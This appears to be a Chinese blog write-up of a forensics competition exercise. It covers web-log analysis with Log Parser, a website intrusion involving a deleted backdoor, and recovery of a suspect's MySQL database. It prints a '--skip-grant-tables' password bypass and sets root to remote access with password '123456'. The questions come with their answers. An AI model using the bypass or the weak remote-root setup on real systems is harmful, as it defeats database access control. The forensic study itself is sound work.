<p>https://pan.baidu.com/s/1cSMfNmN2TVq-6zBxWFNKAg?pwd=GAME</p> 
<p>肉眼审计是不现实的，所以需要用到专业的日志审计工具Log Parser，这个工具可以使用sql语句直接对日志进行查询，这个工具还有可视化版本Log Parser Lizard只需关系sql语句即可。我也是刚开始学习这方面的知识，还没有积累相对完整体系的查询语句，接下来仅对题目中用到的语句进行展示和分析。希望有会日志的高手分享一下经验。</p> 
<p>这里的计算条数可以用Log Parser用sql语句查询得到。<br> <img src="https://images2.imgbox.com/27/4e/shSYohw2_o.png" alt="在这里插入图片描述"></p> 
<p>access这类nginx和apache的日志要选择使用NCSA格式打开。<br> <img src="https://images2.imgbox.com/54/71/VTgLEFMT_o.png" alt="在这里插入图片描述"></p> 
<pre><code class="prism language-sql"><span class="token keyword">SELECT</span> <span class="token keyword">TOP</span> <span class="token number">100</span> <span class="token operator">*</span> <span class="token keyword">FROM</span> <span class="token string">'C:\Users\admin\Desktop\练习1导出文件\access.log'</span>
</code></pre> 
<p>使用Log Parser工具的话我们就是像使用数据库一样去查询日志，而无需管其他一些东西。</p> 
<p>对于这题，我们数一下共有多少条日志</p> 
<p><img src="https://images2.imgbox.com/f0/64/TntNkne8_o.png" alt="在这里插入图片描述"></p> 
<pre><code class="prism language-sql"><span class="token keyword">SELECT</span> <span class="token keyword">TOP</span> <span class="token number">100</span> <span class="token operator">*</span> <span class="token keyword">FROM</span> <span class="token string">'C:\Users\admin\Desktop\练习1导出文件\access.log'</span>
</code></pre> 
<p>查询失败</p> 
<p>使用count(1) 或count(ALL * )</p> 
<pre><code class="prism language-sql"><span class="token keyword">SELECT</span> <span class="token function">count</span><span class="token punctuation">(</span><span class="token keyword">ALL</span> <span class="token operator">*</span> <span class="token punctuation">)</span> <span class="token keyword">FROM</span> <span class="token string">'C:\Users\admin\Desktop\练习1导出文件\access.log'</span>
</code></pre> 
<pre><code class="prism language-sql"><span class="token keyword">SELECT</span> <span class="token function">count</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token keyword">FROM</span> <span class="token string">'C:\Users\admin\Desktop\练习1导出文件\access.log'</span>
</code></pre> 
<p>怎么查出来少一条，还好之前已经使用文本编辑器查看过行数了<br> <img src="https://images2.imgbox.com/93/f5/IYJOj2fl_o.png" alt="在这里插入图片描述"><br> <img src="https://images2.imgbox.com/21/99/kYt9rghT_o.png" alt="在这里插入图片描述"></p> 
<h4><a id="33_HackFindxpngIP180121158139_1187"></a>33. 嫌疑人篡改HackFindx.png时使用的IP地址是180.121.158.139</h4> 
<p>查询request或者referer这两个字段中哪个包含HackFindx.png</p> 
<h4><a id="34_IP479816762_1203"></a>34. 入侵发生前，嫌疑人最近一次扫描网站时所使用的IP地址是47.98.167.62</h4> 
<h4><a id="35_IP36656_1215"></a>35. 接上题，这个IP地址在日志文件中出现的总次数是36656</h4> 
<h4><a id="36_20201000IP19_1227"></a>36. 2020年内，请求不存在页面总次数超过1000次的IP共有19个</h4> 
<h4><a id="37_2020IP183224793412469_1241"></a>37. 2020年内，请求不存在页面总次数最多的IP是183.224.79.34，共有12469次</h4> 
<h3><a id="2_1257"></a>线索2：</h3> 
<p>民警怀疑加密分区里的web.rar与另外一起入侵活动有关，可能是嫌疑人拷贝到本地的网站源码和日志文件。该案中，受害网站于2020年5月9日左右被入侵并被挂暗链，搜索该网站域名时会跳转到其他违法页面。据嫌疑人交代，入侵中曾使用了名为bypass.php的后门文件，随后删除了该文件。</p> 
<h4><a id="38_sha256_1261"></a>38. 压缩包sha256</h4> 
<p><strong>ef4261344dca73a04eb0e8660985db9d6e85a6630e9c0a1ae1a4ed5464573201</strong></p> 
<p><img src="https://images2.imgbox.com/6c/64/rGIh3DEa_o.png" alt="在这里插入图片描述"></p> 
<p>先对网站整体架构进行分析，对各个文件进行查看。</p> 
<h4><a id="39_bypassphp181430181435HHMMSS140327_1274"></a>39. 后门文件bypass.php的可能删除时间为18:14:30至18:14:35之间（格式要求：HH:MM:SS，如14:03:27）</h4> 
<h4><a id="40_admin_1278"></a>40. 嫌疑人为后门文件设置的密码为admin</h4> 
<h4><a id="41_index1php_1282"></a>41. 被篡改的网站源码文件名是index(1).php</h4> 
<h4><a id="42_132126com_1286"></a>42. 暗链中对应的的违法网站域名为132126.com</h4> 
<h3><a id="3_1290"></a>线索3：</h3> 
<p>据嫌疑人交代，其个人电脑的MySQL数据库中也保存着一份公民信息，但MySQL很久未登录账号密码均已经忘记了。</p> 
<p>这题涉及到windows系统mysql取证，可以直接以仿真的形式去虚拟机中取。一个是使用取证工具直接导出数据库。取证工具直接导出没有什么难度，先简单介绍一下。</p> 
<h5><a id="_1296"></a>取证工具</h5> 
<p><img src="https://images2.imgbox.com/a5/24/QU0HgOAp_o.png" alt="在这里插入图片描述"></p> 
<p>再工具箱内安装弘联取证工具的数据库取证插件<br> <img src="https://images2.imgbox.com/02/05/AonfMS6M_o.png" alt="在这里插入图片描述"></p> 
<p>直接再分析页面点击数据库分析即可。</p> 
<p>根据题目需求去对对应的数据库中的信息分析即可。<br> <img src="https://images2.imgbox.com/b0/cd/0mKRccCO_o.png" alt="在这里插入图片描述"></p> 
<p>工具还是有点问题的，不能显示。工具不一定可靠，手工得要会，工具要熟练。</p> 
<h5><a id="_1312"></a>导出</h5> 
<p>将数据data目录导出至我们自己的数据库中，注意要选择版本相近引擎相同的数据库。<br> <img src="https://images2.imgbox.com/38/22/NQC61kKU_o.png" alt="在这里插入图片描述"></p> 
<p>新建一个mysql8的数据库，将原来的data删除，复制data进去。后续需进行一些调错的操作，也是一种搭建数据库的方法。</p> 
<h5><a id="_1320"></a>仿真</h5> 
<p>仿真中，发现mysql并没有设置环境变量<br> <img src="https://images2.imgbox.com/ee/4c/SceSAQTG_o.png" alt="在这里插入图片描述"><br> <img src="https://images2.imgbox.com/97/0d/2wjCTn3p_o.png" alt="在这里插入图片描述"></p> 
<p>搜索mysql，发现是安装了mysql的</p> 
<p>点这个command line工具进行登录数据库，但是有密码<br> <img src="https://images2.imgbox.com/45/5f/FLk3CpXT_o.png" alt="在这里插入图片描述"><br> <img src="https://images2.imgbox.com/cc/98/vn2pGuBg_o.png" alt="在这里插入图片描述"><br> <img src="https://images2.imgbox.com/b0/ac/UaqaD5V7_o.png" alt="在这里插入图片描述"></p> 
<p><a href="https://blog.csdn.net/qq_43342301/article/details/91288891">(7条消息) Mysql8.0以上重置初始密码的方法_Jplusztx的博客-CSDN博客_mysql8.0初始密码</a><br> <img src="https://images2.imgbox.com/26/6f/TKFE2zJM_o.png" alt="在这里插入图片描述"><br> <img src="https://images2.imgbox.com/33/b3/PMENEGfx_o.png" alt="在这里插入图片描述"></p> 
<p>服务名无效</p> 
<p><img src="https://images2.imgbox.com/90/46/x0PwFUzs_o.png" alt="在这里插入图片描述"><br> <img src="https://images2.imgbox.com/bc/cc/Q8V79dQa_o.png" alt="在这里插入图片描述"></p> 
<p>查看服务，服务名为mysql80<br> <img src="https://images2.imgbox.com/c4/a1/mDjPcP7N_o.png" alt="在这里插入图片描述"><br> <img src="https://images2.imgbox.com/9e/b8/zD4RUygE_o.png" alt="在这里插入图片描述"></p> 
<pre><code class="prism language-shell">mysqld --console --skip-grant-tables --shared-memory
</code></pre> 
<p>报错，发现是因为程序目录下缺少配置信息my.ini，但我们在数据目录下发现有该配置文件，拷贝过来即可成功运行该语句</p> 
<p><a href="https://blog.csdn.net/wangzhepaohui/article/details/109685612">(7条消息) Mysql 80 解决忘记密码无法跳过错误 mysqld --console --skip-grant-tables --shared-memory 代码无效的问题_陆深Jason的博客-CSDN博客_mysql8 跳过密码</a><br> <img src="https://images2.imgbox.com/3b/5a/FTB2DKuw_o.png" alt="在这里插入图片描述"></p> 
<p>已绕过密码<br> <img src="https://images2.imgbox.com/9e/1f/xhjGQKxS_o.png" alt="在这里插入图片描述"></p> 
<h4><a id="43_3_1365"></a>43. 该数据库有3个允许远程登录的账号</h4> 
<p>mysql的账号信息存储在mysql系统数据库mysql库中，查看mysql库中的数据</p> 
<p>开始查询<br> <img src="https://images2.imgbox.com/e0/5e/9XNhDFWs_o.png" alt="在这里插入图片描述"><br> <img src="https://images2.imgbox.com/d5/f0/YgugnNly_o.png" alt="在这里插入图片描述"></p> 
<p>共有三个账户允许远程登陆</p> 
<pre><code class="prism language-mysql">C:\Program Files\MySQL\MySQL Server 8.0\bin&gt;mysql -u root -p
Enter password: *
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 8
Server version: 8.0.25 MySQL Community Server - GPL

Copyright (c) 2000, 2021, Oracle and/or its affiliates.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql&gt; show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| mysql              |
| performance_schema |
| student            |
| sys                |
+--------------------+
5 rows in set (0.00 sec)

mysql&gt; use mysql;
Database changed
mysql&gt; show tables;
+------------------------------------------------------+
| Tables_in_mysql                                      |
+------------------------------------------------------+
| columns_priv                                         |
| component                                            |
| db                                                   |
| default_roles                                        |
| engine_cost                                          |
| func                                                 |
| general_log                                          |
| global_grants                                        |
| gtid_executed                                        |
| help_category                                        |
| help_keyword                                         |
| help_relation                                        |
| help_topic                                           |
| innodb_index_stats                                   |
| innodb_table_stats                                   |
| password_history                                     |
| plugin                                               |
| procs_priv                                           |
| proxies_priv                                         |
| replication_asynchronous_connection_failover         |
| replication_asynchronous_connection_failover_managed |
| role_edges                                           |
| server_cost                                          |
| servers                                              |
| slave_master_info                                    |
| slave_relay_log_info                                 |
| slave_worker_info                                    |
| slow_log                                             |
| tables_priv                                          |
| time_zone                                            |
| time_zone_leap_second                                |
| time_zone_name                                       |
| time_zone_transition                                 |
| time_zone_transition_type                            |
| user                                                 |
+------------------------------------------------------+
35 rows in set (0.08 sec)

mysql&gt; select user,host from user;
+------------------+-----------+
| user             | host      |
+------------------+-----------+
| sae_user         | %         |
| student          | %         |
| zhao4            | %         |
| mysql.infoschema | localhost |
| mysql.session    | localhost |
| mysql.sys        | localhost |
| root             | localhost |
+------------------+-----------+
7 rows in set (0.00 sec)

mysql&gt;
</code></pre> 
<h4><a id="44_studentinfoBLOB_1464"></a>44. student表中，info字段的数据类型是BLOB</h4> 
<p><img src="https://images2.imgbox.com/bb/6f/r2W4Cwr7_o.png" alt="在这里插入图片描述"></p> 
<pre><code class="prism language-mysql">mysql&gt; use  student;
Database changed
mysql&gt; show tables;
+-------------------+
| Tables_in_student |
+-------------------+
| student           |
+-------------------+
1 row in set (0.00 sec)
mysql&gt; describe student;
+-------+------+------+-----+---------+-------+
| Field | Type | Null | Key | Default | Extra |
+-------+------+------+-----+---------+-------+
| info  | blob | YES  |     | NULL    |       |
+-------+------+------+-----+---------+-------+
1 row in set (0.04 sec)
</code></pre> 
<h4><a id="45_4_1487"></a>45. 该数据库中共记录了学生信息4条</h4> 
<p>由于student数据库是blob类型的数据，且root用户不允许外联，而且同学们对sql语句比较生疏，所以我们设置root用户允许外联，修改root密码，停止绕过密码，使用navicat连接查看。</p> 
<pre><code class="prism language-mysql">mysql&gt; select host, user, authentication_string, plugin from mysql.user;
+-----------+------------------+------------------------------------------------------------------------+-----------------------+
| host      | user             | authentication_string                                                  | plugin                |
+-----------+------------------+------------------------------------------------------------------------+-----------------------+
| %         | sae_user         | *97D8E5ED2EE9FE9809C66F39EE89AAC6436A6BD2                              | mysql_native_password |
| %         | student          | *1308E0FCD43112F8D948AB093F54892CB7B220AA                              | mysql_native_password |
| %         | zhao4            | *E34812A167F82B0880CEC1F835BE786C42E3E66A                              | mysql_native_password |
| localhost | mysql.infoschema | $A$005$THISISACOMBINATIONOFINVALIDSALTANDPASSWORDTHATMUSTNEVERBRBEUSED | caching_sha2_password |
| localhost | mysql.session    | $A$005$THISISACOMBINATIONOFINVALIDSALTANDPASSWORDTHATMUSTNEVERBRBEUSED | caching_sha2_password |
| localhost | mysql.sys        | $A$005$THISISACOMBINATIONOFINVALIDSALTANDPASSWORDTHATMUSTNEVERBRBEUSED | caching_sha2_password |
| localhost | root             | *97D8E5ED2EE9FE9809C66F39EE89AAC6436A6BD2                              | mysql_native_password |
+-----------+------------------+------------------------------------------------------------------------+-----------------------+
7 rows in set (0.00 sec)

mysql&gt; use mysql;
Database changed
mysql&gt; update user set host='%' where user = 'root';
Query OK, 1 row affected (0.02 sec)
Rows matched: 1  Changed: 1  Warnings: 0
mysql&gt; ALTER USER 'root'@'%' IDENTIFIED WITH MYSQL_NATIVE_PASSWORD BY '123456';
Query OK, 0 rows affected (0.02 sec)
mysql&gt; flush privileges;
Query OK, 0 rows affected (0.06 sec)
mysql&gt; select host, user, authentication_string, plugin from mysql.user;
+-----------+------------------+------------------------------------------------------------------------+-----------------------+
| host      | user             | authentication_string                                                  | plugin                |
+-----------+------------------+------------------------------------------------------------------------+-----------------------+
| %         | root             | *6BB4837EB74329105EE4568DDA7DC67ED2CA2AD9                              | mysql_native_password |
| %         | sae_user         | *97D8E5ED2EE9FE9809C66F39EE89AAC6436A6BD2                              | mysql_native_password |
| %         | student          | *1308E0FCD43112F8D948AB093F54892CB7B220AA                              | mysql_native_password |
| %         | zhao4            | *E34812A167F82B0880CEC1F835BE786C42E3E66A                              | mysql_native_password |
| localhost | mysql.infoschema | $A$005$THISISACOMBINATIONOFINVALIDSALTANDPASSWORDTHATMUSTNEVERBRBEUSED | caching_sha2_password |
| localhost | mysql.session    | $A$005$THISISACOMBINATIONOFINVALIDSALTANDPASSWORDTHATMUSTNEVERBRBEUSED | caching_sha2_password |
| localhost | mysql.sys        | $A$005$THISISACOMBINATIONOFINVALIDSALTANDPASSWORDTHATMUSTNEVERBRBEUSED | caching_sha2_password |
+-----------+------------------+------------------------------------------------------------------------+-----------------------+
7 rows in set (0.00 sec)
mysql&gt; exit
Bye
</code></pre> 
<p>将之前的窗口全部关闭，重启服务即可远程连接。<br> <img src="https://images2.imgbox.com/b4/fa/BRvKKNVu_o.png" alt="在这里插入图片描述"><br> <img src="https://images2.imgbox.com/53/94/w9PqD1Rb_o.png" alt="在这里插入图片描述"><br> <img src="https://images2.imgbox.com/ba/ad/G9yhDn3q_o.png" alt="在这里插入图片描述"><br> 可以看到这个blob数据为一个图像，其中有4条数据</p>
                </div>
		</div>
		<div id="gabottom"></div>
	</article>
</main>


<nav class="pager flex">
	<div class="pager__item pager__item--prev">
		<a class="pager__link" href="/posts/2e1a1536a15ca9c8eef3da39b9b619a8/" rel="prev">
			<span class="pager__subtitle">«&thinsp;Previous</span>
			<p class="pager__title">Linux添加、删除默认路由</p>
		</a>
	</div>
	<div class="pager__item pager__item--next">
		<a class="pager__link" href="/posts/0692d8b55adfd234b74fac7e8be70c9c/" rel="next">
			<span class="pager__subtitle">Next&thinsp;»</span>
			<p class="pager__title">使用REDIS的INCREMENT方法生成自增主键，并发量每秒一万</p>
		</a>
	</div>
</nav>


			</div>
			
		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2024 菜鸟程序员博客.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>
<div id="gafoot"></div>
<script src="https://101121.xyz/ga/app.js"></script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>